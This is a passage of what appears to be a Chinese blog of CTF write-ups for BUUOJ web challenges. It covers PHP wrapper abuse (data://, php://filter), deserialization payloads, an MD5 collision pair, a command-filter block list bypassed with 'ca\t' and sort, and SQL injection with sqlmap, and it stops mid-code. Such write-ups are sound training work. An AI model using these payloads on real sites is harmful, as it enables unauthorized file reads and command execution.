zjctf”是否被写入，true则输出写入的内容，第二个if先过滤了flag，然后包含file，提示了useless.php，接着反序列化password<br>一步步来。<br>第一层file_get_contents会造成文件包含漏洞，这可以利用data伪协议通过<br><img src=\"https://img-blog.csdnimg.cn/20200528110141477.png\" alt=\"在这里插入图片描述\"><br>可以加base64防止过滤，这里就直接加上内容即可，构造payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</span><br></pre></td></tr></table></figure>\n<p>第二部分利用filter来读源码<br><img src=\"https://img-blog.csdnimg.cn/20200528110437468.png\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>\n<p>执行后得到useless.php的base64源码：<br><img src=\"https://img-blog.csdnimg.cn/20200528110758903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>解码如下:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span></span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;file); </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">\"U R SO CLOSE !///COME ON PLZ\"</span>);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>有个flag.php，file可控，接着输出对象，那么可以在此基础构造password序列化：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span></span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;file); </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">\"U R SO CLOSE !///COME ON PLZ\"</span>);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$payload = <span class=\"keyword\">new</span> Flag();</span><br><span class=\"line\">$payload-&gt;file = <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($payload);</span><br><span class=\"line\"><span class=\"comment\">//O:4:\"Flag\":1:&#123;s:4:\"file\";s:8:\"flag.php\";&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>最终得到得payload为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>嗯？没反应，原来是第二步还是读了源码没改过来，那么是：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>成功回显：<br><img src=\"https://img-blog.csdnimg.cn/20200528112327758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>flag在源码里：<br><img src=\"https://img-blog.csdnimg.cn/20200528112356958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["serialize","代码审计"]},{"title":"安洵杯2019——easy_web","url":"/2020/05/31/buu8%E2%80%94%E2%80%94%5Banxunbei%202019%5Deasy_web/","content":"<p>平台：buuoj.cn<br>打开靶机来自web狗的卑微（多么痛的领悟~）<br><img src=\"https://img-blog.csdnimg.cn/20200531140248781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>源码里是左上角图片的base64形式，url里有base64字符串，解码看看<br><img src=\"https://img-blog.csdnimg.cn/20200531140416422.png\" alt=\"在这里插入图片描述\"><br>两次base64一次hex<br><img src=\"https://img-blog.csdnimg.cn/20200531140518911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>既然通过文件名构造字符串，那么用index.php试试<br><img src=\"https://img-blog.csdnimg.cn/20200531140935663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>传入img得到index.php的base64源码<br><img src=\"https://img-blog.csdnimg.cn/20200531141154528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>解码得源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class=\"line\">header(<span class=\"string\">'content-type:text/html;charset=utf-8'</span>);</span><br><span class=\"line\">$cmd = $_GET[<span class=\"string\">'cmd'</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'img'</span>]) || !<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'cmd'</span>])) </span><br><span class=\"line\">    header(<span class=\"string\">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class=\"line\">$file = hex2bin(base64_decode(base64_decode($_GET[<span class=\"string\">'img'</span>])));</span><br><span class=\"line\"></span><br><span class=\"line\">$file = preg_replace(<span class=\"string\">\"/[^a-zA-Z0-9.]+/\"</span>, <span class=\"string\">\"\"</span>, $file);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (preg_match(<span class=\"string\">\"/flag/i\"</span>, $file)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;img src =\"./ctf3.jpeg\"&gt;'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"xixi～ no flag\"</span>);<span class=\"comment\">//读不了flag.*</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    $txt = base64_encode(file_get_contents($file));</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;img src='data:image/gif;base64,\"</span> . $txt . <span class=\"string\">\"'&gt;&lt;/img&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $cmd;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (preg_match(<span class=\"string\">\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i\"</span>, $cmd)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span>(<span class=\"string\">\"forbid ~\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((string)$_POST[<span class=\"string\">'a'</span>] !== (string)$_POST[<span class=\"string\">'b'</span>] &amp;&amp; md5($_POST[<span class=\"string\">'a'</span>]) === md5($_POST[<span class=\"string\">'b'</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> `$cmd`;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> (<span class=\"string\">\"md5 is funny ~\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">  body&#123;</span><br><span class=\"line\">   background:url(./bj.png)  no-repeat center center;</span><br><span class=\"line\">   background-size:cover;</span><br><span class=\"line\">   background-attachment:fixed;</span><br><span class=\"line\">   background-color:<span class=\"comment\">#CCCCCC;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>前面得$file参数过滤了flag关键词，所以我们的重点是第二个参数cmd。<br>来看第二部分，首先是第一个preg_match，过滤了大部分的命令执行，接着是一个md5强碰撞。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/2020053114221480.png\" alt=\"在这里插入图片描述\"><br>要求post a和b，不能是同一个字符串但是md5之后类型和数值相同。<br>在网上找到的：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">a=%<span class=\"number\">4</span>d%c9%<span class=\"number\">68</span>%ff%<span class=\"number\">0</span>e%e3%<span class=\"number\">5</span>c%<span class=\"number\">20</span>%<span class=\"number\">95</span>%<span class=\"number\">72</span>%d4%<span class=\"number\">77</span>%<span class=\"number\">7</span>b%<span class=\"number\">72</span>%<span class=\"number\">15</span>%<span class=\"number\">87</span>%d3%<span class=\"number\">6</span>f%a7%b2%<span class=\"number\">1</span>b%dc%<span class=\"number\">56</span>%b7%<span class=\"number\">4</span>a%<span class=\"number\">3</span>d%c0%<span class=\"number\">78</span>%<span class=\"number\">3</span>e%<span class=\"number\">7</span>b%<span class=\"number\">95</span>%<span class=\"number\">18</span>%af%bf%a2%<span class=\"number\">00</span>%a8%<span class=\"number\">28</span>%<span class=\"number\">4</span>b%f3%<span class=\"number\">6</span>e%<span class=\"number\">8</span>e%<span class=\"number\">4</span>b%<span class=\"number\">55</span>%b3%<span class=\"number\">5</span>f%<span class=\"number\">42</span>%<span class=\"number\">75</span>%<span class=\"number\">93</span>%d8%<span class=\"number\">49</span>%<span class=\"number\">67</span>%<span class=\"number\">6</span>d%a0%d1%<span class=\"number\">55</span>%<span class=\"number\">5</span>d%<span class=\"number\">83</span>%<span class=\"number\">60</span>%fb%<span class=\"number\">5</span>f%<span class=\"number\">07</span>%fe%a2</span><br><span class=\"line\">&amp;b=%<span class=\"number\">4</span>d%c9%<span class=\"number\">68</span>%ff%<span class=\"number\">0</span>e%e3%<span class=\"number\">5</span>c%<span class=\"number\">20</span>%<span class=\"number\">95</span>%<span class=\"number\">72</span>%d4%<span class=\"number\">77</span>%<span class=\"number\">7</span>b%<span class=\"number\">72</span>%<span class=\"number\">15</span>%<span class=\"number\">87</span>%d3%<span class=\"number\">6</span>f%a7%b2%<span class=\"number\">1</span>b%dc%<span class=\"number\">56</span>%b7%<span class=\"number\">4</span>a%<span class=\"number\">3</span>d%c0%<span class=\"number\">78</span>%<span class=\"number\">3</span>e%<span class=\"number\">7</span>b%<span class=\"number\">95</span>%<span class=\"number\">18</span>%af%bf%a2%<span class=\"number\">02</span>%a8%<span class=\"number\">28</span>%<span class=\"number\">4</span>b%f3%<span class=\"number\">6</span>e%<span class=\"number\">8</span>e%<span class=\"number\">4</span>b%<span class=\"number\">55</span>%b3%<span class=\"number\">5</span>f%<span class=\"number\">42</span>%<span class=\"number\">75</span>%<span class=\"number\">93</span>%d8%<span class=\"number\">49</span>%<span class=\"number\">67</span>%<span class=\"number\">6</span>d%a0%d1%d5%<span class=\"number\">5</span>d%<span class=\"number\">83</span>%<span class=\"number\">60</span>%fb%<span class=\"number\">5</span>f%<span class=\"number\">07</span>%fe%a2</span><br></pre></td></tr></table></figure>\n\n<p>然后我们就可以通过cmd执行命令<br>不能用ls但是用dir，看看flag在哪<br><img src=\"https://img-blog.csdnimg.cn/20200531150757582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>接下来就是读flag<br>预期解（其中一个）：<br>sort命令</p>\n<blockquote>\n<p>sort 命令将以默认的方式将文本文件的第一列以ASCII 码的次序排列，并将结果输出到标准输出。</p>\n</blockquote>\n<p>读到flag<br><img src=\"https://img-blog.csdnimg.cn/2020053115110354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>非预期：<br>过滤反斜杠 |\\|\\\\| 这里的正则没有写好，因此造成了 ca\\t 命令可以直接读取 flag<br><img src=\"https://img-blog.csdnimg.cn/20200531151632433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["代码审计"]},{"title":"网鼎杯2020青龙组——AreUSerialz","url":"/2020/05/31/buu7%E2%80%94%E2%80%94%5Bwangdingbei%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz/","content":"<p>平台：buuoj.cn<br>打开靶机即得源码<br>分析一下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">\"flag.php\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileHandler</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $op;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $filename;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $content;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $op = <span class=\"string\">\"1\"</span>;</span><br><span class=\"line\">        $filename = <span class=\"string\">\"/tmp/tmpfile\"</span>;</span><br><span class=\"line\">        $content = <span class=\"string\">\"Hello World!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;process();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">process</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;op == <span class=\"string\">\"1\"</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;write();<span class=\"comment\">//op=1时，执行write()中的file_put_contents</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;op == <span class=\"string\">\"2\"</span>) &#123;</span><br><span class=\"line\">            $res = <span class=\"keyword\">$this</span>-&gt;read();<span class=\"comment\">//op=2时，执行read()中的file_get_contents</span></span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;output($res);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;output(<span class=\"string\">\"Bad Hacker!\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;filename) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;content)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(strlen((string)<span class=\"keyword\">$this</span>-&gt;content) &gt; <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;output(<span class=\"string\">\"Too long!\"</span>);</span><br><span class=\"line\">                <span class=\"keyword\">die</span>();</span><br><span class=\"line\">            &#125;<span class=\"comment\">//长度过长检测</span></span><br><span class=\"line\">            $res = file_put_contents(<span class=\"keyword\">$this</span>-&gt;filename, <span class=\"keyword\">$this</span>-&gt;content);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>($res) <span class=\"keyword\">$this</span>-&gt;output(<span class=\"string\">\"Successful!\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">$this</span>-&gt;output(<span class=\"string\">\"Failed!\"</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;output(<span class=\"string\">\"Failed!\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">read</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $res = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;filename)) &#123;</span><br><span class=\"line\">            $res = file_get_contents(<span class=\"keyword\">$this</span>-&gt;filename);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">output</span><span class=\"params\">($s)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"[Result]: &lt;br&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $s;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;op === <span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;op = <span class=\"string\">\"1\"</span>;<span class=\"comment\">//强类型比较，函数调用结束时op=2调整为1</span></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;content = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;process();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">is_valid</span><span class=\"params\">($s)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>($i = <span class=\"number\">0</span>; $i &lt; strlen($s); $i++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!(ord($s[$i]) &gt;= <span class=\"number\">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class=\"number\">125</span>))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;<span class=\"comment\">//判断传入的字符串是否为可打印字符</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET&#123;<span class=\"string\">'str'</span>&#125;)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $str = (string)$_GET[<span class=\"string\">'str'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(is_valid($str)) &#123;</span><br><span class=\"line\">        $obj = unserialize($str);</span><br><span class=\"line\">    &#125;<span class=\"comment\">//反序列化传入的字符串</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>考点是反序列化漏洞，我们需要将filename=flag.php序列化传入。<br>首先传入的字符串会经过is_vaild检测，传入的payload均要是可打印字符，但protected类型会加上%00进行标识，%00被url解码后ASCII值为0，不在32-125之间，导致不能通过。<br>绕过：php7对类的修饰不敏感，直接把属性修饰为public，正常序列化即可<br>第二部分是函数调用结束后__destruct会自动把op的值改为1<br>op===”2”类型和数值都必须等于’2’，后调用process又进行op==“2”不检查类型，使用弱类型2 == “2”设置op是数字2进行绕过即可。<br>构造exp如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileHandler</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $op;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $filename;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $content;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$payload = <span class=\"keyword\">new</span> FileHandler();</span><br><span class=\"line\">$payload-&gt;op = <span class=\"number\">2</span>;</span><br><span class=\"line\">$payload-&gt;filename = <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\">$payload-&gt;content = <span class=\"string\">\"whatever\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($payload);</span><br></pre></td></tr></table></figure>\n<p>源码处得到flag<br><img src=\"https://img-blog.csdnimg.cn/20200531084603115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>buu上应当是改了路径，比赛的flag.php的是要通过cmdline读取它的绝对路径才能得到flag.php的位置。</p>\n","categories":["buu刷题"],"tags":["serialize","代码审计"]},{"title":"网鼎杯2018——Fakebook","url":"/2020/05/27/buu3%E2%80%94%E2%80%94%5Bwangdingbei%202018%5DFakebook/","content":"<p>平台：buuoj.cn<br>打开靶机<br><img src=\"https://img-blog.csdnimg.cn/20200527112543783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>有个登录和注册，打开登录框看看<br><img src=\"https://img-blog.csdnimg.cn/20200527112631443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>万能密码，sql注入fuzz，弱密码全跑一遍，没什么变化，那就注册看看。<br><img src=\"https://img-blog.csdnimg.cn/20200527112817480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>进去之后出现用户记录。<br><img src=\"https://img-blog.csdnimg.cn/2020052711293410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>点进用户名看看，这是注意到url：<br><img src=\"https://img-blog.csdnimg.cn/20200527113017624.png\" alt=\"在这里插入图片描述\"><br>有可能存在注入，试着让他报错。<br>单引号测试：<br><img src=\"https://img-blog.csdnimg.cn/20200527115727293.png\" alt=\"在这里插入图片描述\"><br>可以看到除了数据库错误外，还直接显示出了物理路径。<br>把东西先注出来再说，这里过滤了一些东西，我这就直接sqlmap跑一下了，加个–no-cast参数<br><img src=\"https://img-blog.csdnimg.cn/20200527120409839.png\" alt=\"在这里插入图片描述\"><br>当然可以手注，看别的师傅是用报错成功注入<br>一系列流程走一遍最后发现除了admin和passwd外，注出来有个列里有个data序列化字符串：<br><img src=\"https://img-blog.csdnimg.cn/20200527120754256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>嗯。。。忽略了一个东西，dirsearch扫一下发现有个robots.txt和flag.php，flag.php应该就是要读取flag的地方了，robots.txt提示有个index,php.bak备份文件，下下来看看：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $blog = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($name, $age, $blog)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;name = $name;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age = (int)$age;</span><br><span class=\"line\">        <span 